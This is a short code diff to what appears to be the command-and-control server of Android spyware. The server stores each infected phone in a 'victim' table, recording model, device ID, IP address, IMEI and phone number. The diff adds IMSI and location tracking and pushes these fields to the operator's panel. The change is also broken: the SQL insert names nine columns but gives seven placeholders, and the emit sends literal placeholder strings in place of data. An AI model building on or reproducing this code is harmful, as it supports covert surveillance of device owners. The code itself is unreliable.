@@ -66,7 +66,7 @@ def value_changed(data):
         record = cur.fetchall()
         if record.__len__() == 0:
             cur.execute(
-                "INSERT INTO victim(model, deviceid, ipaddress, api, imei, socketid, phone) VALUES(?, ?, ?, ?, ?, ?, ?)",
+                "INSERT INTO victim(model, deviceid, ipaddress, api, imei, socketid, phone, imsi, location) VALUES(?, ?, ?, ?, ?, ?, ?)",
                 (
                     data['model'],
                     data['device_id'],
@@ -92,7 +92,7 @@ def value_changed(data):
         con.close()
     except sqlite3.Error as error:
         print(error)
-    emit("new device", {'data': [data['model'], data['device_id'], request.remote_addr, data['api'], data['imei'], request.sid, "phone placeholder"]})
+    emit("new device", {'data': [data['model'], data['device_id'], request.remote_addr, data['api'], data['imei'], request.sid, "phone", "imsi", "location"]})
 
     # emit('android value', message, broadcast=True,)
 
